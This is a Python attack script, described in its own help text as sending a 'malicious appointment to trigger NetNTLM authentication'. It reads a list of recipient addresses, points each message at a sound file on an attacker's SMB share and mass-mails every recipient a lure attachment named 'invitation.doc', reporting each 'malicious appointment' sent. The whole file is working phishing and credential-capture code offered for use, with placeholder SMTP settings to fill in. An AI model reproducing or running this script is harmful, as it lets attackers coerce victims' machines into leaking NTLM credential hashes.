import argparse
import smtplib

from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formatdate


def parse_arguments():
    parser = argparse.ArgumentParser(description='send malicious appointment to trigger NetNTLM authentication')
    parser.add_argument('-p', '--path', type=str,
                        help='SMB share machine IP', required=True)
    parser.add_argument('-f', '--file', type=str, help='Path to file with recipients', required=True)
    args = parser.parse_args()
    add_recipients_to_delivery(args)


def add_recipients_to_delivery(args):
    print(args)
    lines: str = open(args.file, 'r').read()
    if len(lines) is not None:
        emails = lines.rsplit('\n')
        # removing empty line
        emails.pop(len(emails) - 1)
        set_of_recipients = set(emails)
        exploit(set_of_recipients, args.path)


def exploit(set_of_recipients, path):
    # sound file from smb share
    full_path: str = f"\\\\{path}\\sound.wav"
    print('full path of share: ' + full_path)
    # change SMTP server configuration with credentials.
    smtp_server = "change me. place for ip address or domain name"
    smtp_port = 465
    sender_email = "username with domain name"
    sender_password = "user password"

    class Email:
        def __init__(self, _smtp_server, port, username, password, recipient):
            self.smtp_server = _smtp_server
            self.port = port
            self.username = username
            self.password = password
            self.recipient = recipient

        def send(self, mail_subject, mail_body, attachment_path):
            msg = MIMEMultipart()
            msg['From'] = self.username
            msg['To'] = self.recipient
            msg['Date'] = formatdate(localtime=True)
            msg['Subject'] = mail_subject
            msg.attach(MIMEText(mail_body))

            with open(attachment_path, 'rb') as f:
                # change filename with extension if needed
                filename = f'invitation.doc'
                part = MIMEApplication(f.read(), Name=attachment_path)
                part['Content-Disposition'] = f'attachment; filename="{filename}"'
                msg.attach(part)

            try:
                server = smtplib.SMTP(self.smtp_server, self.port)
                server.starttls()
                server.login(self.username, self.password)
                server.sendmail(self.username, self.recipient, msg.as_string())
                server.quit()
                print("[+] Malicious appointment to " + self.recipient + "  has been successfully sent.")

            except Exception as e:
                print("[-] Error with SMTP server...", e)

    for recipient_email in set_of_recipients:
        email = Email(smtp_server, smtp_port, sender_email, sender_password, recipient_email)
        subject = "Message title"
        body = "Message body"
        # in send function attachment path should be point to sound file or other. double check this
        email.send(subject, body, full_path)


if __name__ == '__main__':
    parse_arguments()
